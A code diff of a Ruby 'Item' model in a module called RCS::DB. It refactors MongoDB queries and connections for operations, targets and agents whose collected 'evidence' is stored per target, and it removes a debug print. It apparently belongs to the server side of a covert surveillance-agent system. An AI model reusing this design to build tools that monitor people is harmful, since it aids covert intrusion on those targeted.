@@ -117,7 +117,7 @@ class Item
       when 'operation'
         self.stat.size = 0
         self.stat.grid_size = 0
-        targets = Item.where(_kind: 'target').also_in(path: [self._id]).only(:stat)
+        targets = Item.where(_kind: 'target').in(path: [self._id]).only(:stat)
         targets.each do |t|
           self.stat.size += t.stat.size
           self.stat.grid_size += t.stat.grid_size
@@ -129,7 +129,7 @@ class Item
       when 'target'
         self.stat.evidence = {}
         self.stat.dashboard = {}
-        agents = Item.where(_kind: 'agent', deleted: false).also_in(path: [self._id]).only(:stat)
+        agents = Item.where(_kind: 'agent', deleted: false).in(path: [self._id]).only(:stat)
         agents.each do |a|
           self.stat.evidence.merge!(a.stat.evidence) {|k,o,n| o+n }
           self.stat.dashboard.merge!(a.stat.dashboard) {|k,o,n| o+n }
@@ -137,7 +137,7 @@ class Item
             self.stat.last_sync = a.stat.last_sync
           end
         end
-        db = Mongoid.database
+        db = RCS::DB::DB.instance.new_mongo_connection("rcs")
         # evidence size
         collection = db.collection('evidence.' + self._id.to_s)
         self.stat.size = collection.stats['size'].to_i
@@ -442,7 +442,7 @@ class Item
         # destroy all the agents of this target
         # to speed up the process, set the DROPPING flag.
         # during callbacks the agent will not delete the evidence
-        Item.any_in({_kind: ['factory', 'agent']}).also_in({path: [ self._id ]}).each do |agent|
+        Item.any_in({_kind: ['factory', 'agent']}).in({path: [ self._id ]}).each do |agent|
           agent[:dropping] = true
           agent.save
           agent.destroy
@@ -486,7 +486,7 @@ class Item
     return if self._kind != 'target'
 
     # create the collection for the target's evidence and shard it
-    db = Mongoid.database
+    db = RCS::DB::DB.instance.new_mongo_connection("rcs")
     collection = db.collection(Evidence.collection_name(self._id))
     # ensure indexes
     Evidence.collection_class(self._id).create_indexes
@@ -554,7 +554,7 @@ class Item
           target.save
         end
       when 'target'
-        Item.any_in({_kind: ['agent', 'factory']}).also_in({path: [ self._id ]}).each do |agent|
+        Item.any_in({_kind: ['agent', 'factory']}).in({path: [ self._id ]}).each do |agent|
           agent.status = 'closed'
           agent.save
         end
@@ -575,8 +575,6 @@ class Item
     if self._kind == 'agent'
       hash << [self.instance, self.type, self.platform, self.deleted, self.uninstalled, self.demo, self.upgradable, self.scout, self.good]
     end
-
-    puts hash.inspect
 
     aes_encrypt(Digest::SHA1.digest(hash.inspect), Digest::SHA1.digest("∫∑x=1 ∆t")).unpack('H*').first
   end
